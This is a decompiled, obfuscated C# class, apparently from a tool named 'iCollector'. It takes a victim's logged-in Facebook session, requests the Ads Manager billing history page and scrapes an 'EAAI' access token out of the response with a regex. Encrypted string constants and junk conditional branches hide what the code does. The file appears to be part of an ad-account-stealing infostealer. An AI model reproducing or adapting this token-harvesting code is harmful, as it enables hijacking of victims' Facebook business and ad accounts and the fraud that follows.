using System;
using System.Collections.Generic;
using iCollector.Job.Model;
using iCollector.Model;
using iCollector.RestClient;
using iCollector.Util;

namespace iCollector.Job.SocialJob;

internal class GetEAAITokenJob
{
	private static string CLAZZ_NAME_SE = "GetEAAITokenJob";

	private static string CLAZZ_NAME = SecurityUtils.ReadStructEncrypted(CLAZZ_NAME_SE);

	private static string METHOD_EXEC_SE = "Execute";

	private static string METHOD_EXEC = SecurityUtils.ReadStructEncrypted(METHOD_EXEC_SE);

	private static string GET_EAAI_SE = "GET_EAAI";

	private static string GET_EAAI = SecurityUtils.ReadStructEncrypted(GET_EAAI_SE);

	private static string REGEX_01_SE = "EAAI(.*?)"";

	private static string REGEX_01 = SecurityUtils.ReadStructEncrypted(REGEX_01_SE);

	private static string LOG_01_SE = "Get EAAI empty id";

	private static string LOG_01 = SecurityUtils.ReadStructEncrypted(LOG_01_SE);

	private static string EAAI_SE = "EAAI";

	private static string EAAI = SecurityUtils.ReadStructEncrypted(EAAI_SE);

	private static readonly string URL_1_SE = "https://www.facebook.com/ads/manager/billing_history/summary";

	private static readonly string URL_1 = SecurityUtils.ReadStructEncrypted(URL_1_SE);

	private Logger log = Logger.Instance();

	private JobExecutor jobExecutor = new JobExecutor();

	private LogContext ctx = new LogContext(CLAZZ_NAME);

	public string Execute(SocialProfile profile)
	{
		LogContext logContext = ctx;
		string mETHOD_EXEC = METHOD_EXEC;
		if (true)
		{
			logContext.MethodName = mETHOD_EXEC;
		}
		Step step = new Step();
		Step step2;
		if (3u != 0)
		{
			step2 = step;
		}
		if (4u != 0)
		{
			step2.Index = 0;
		}
		if (8 == 0)
		{
			goto IL_0076;
		}
		if (0 == 0)
		{
			string gET_EAAI = GET_EAAI;
			if (0 == 0)
			{
				step2.Name = gET_EAAI;
			}
			if (true)
			{
				step2.Type = StepType.CURL;
			}
			if (7u != 0)
			{
				if (4u != 0)
				{
					step2.StopWhenSuccess = true;
				}
				if (true)
				{
					step2.StopWhenFailed = true;
				}
				Func<string, StepResult> checkResultFunc = (string r) => ResolveEAAI(r);
				if (0 == 0)
				{
					step2.CheckResultFunc = checkResultFunc;
				}
				goto IL_0076;
			}
		}
		goto IL_00c7;
		IL_00c7:
		JobModel<string> jobModel;
		Step item = default(Step);
		if (uint.MaxValue != 0)
		{
			jobModel = new JobModel<string>
			{
				Name = GET_EAAI,
				Steps = new List<Step> { item },
				SuccessWhenAnyStepSuccess = true,
				ResultAtAnyLastStepSuccess = true
			};
			jobExecutor.Execute(jobModel);
		}
		log.Info(ctx, GET_EAAI + jobModel.Result);
		return jobModel.Result;
		IL_0076:
		CURLStepSpec cURLStepSpec = new CURLStepSpec();
		CURLStepSpec cURLStepSpec2;
		if (2u != 0)
		{
			cURLStepSpec2 = cURLStepSpec;
		}
		string uRL_ = URL_1;
		if (6u != 0)
		{
			cURLStepSpec2.Url = uRL_;
		}
		string[] headers = new string[2] { "Sec-Fetch-Dest: document", "Sec-Fetch-Mode: navigate" };
		if (0 == 0)
		{
			cURLStepSpec2.Headers = headers;
		}
		IRestClient restClient = profile.RestClient;
		if (true)
		{
			cURLStepSpec2.RestClient = restClient;
		}
		step2.Spec = cURLStepSpec2;
		item = step2;
		goto IL_00c7;
	}

	private StepResult ResolveEAAI(string response)
	{
		string text = RegexUtils.FindRegex(response, REGEX_01);
		string text2 = default(string);
		if (3u != 0 && 0 == 0)
		{
			text2 = text;
		}
		int num;
		if (string.IsNullOrEmpty(text2) || 4 == 0)
		{
			do
			{
				Logger logger = log;
				LogContext logContext = ctx;
				string lOG_ = LOG_01;
				if (3u != 0 && uint.MaxValue != 0)
				{
					logger.Info(logContext, lOG_);
				}
			}
			while (false);
			num = 0;
		}
		else
		{
			num = 1;
			if (num != 0)
			{
				return StepResult.Of((byte)num != 0, EAAI + text2);
			}
		}
		return StepResult.Of((byte)num != 0, "");
	}
}
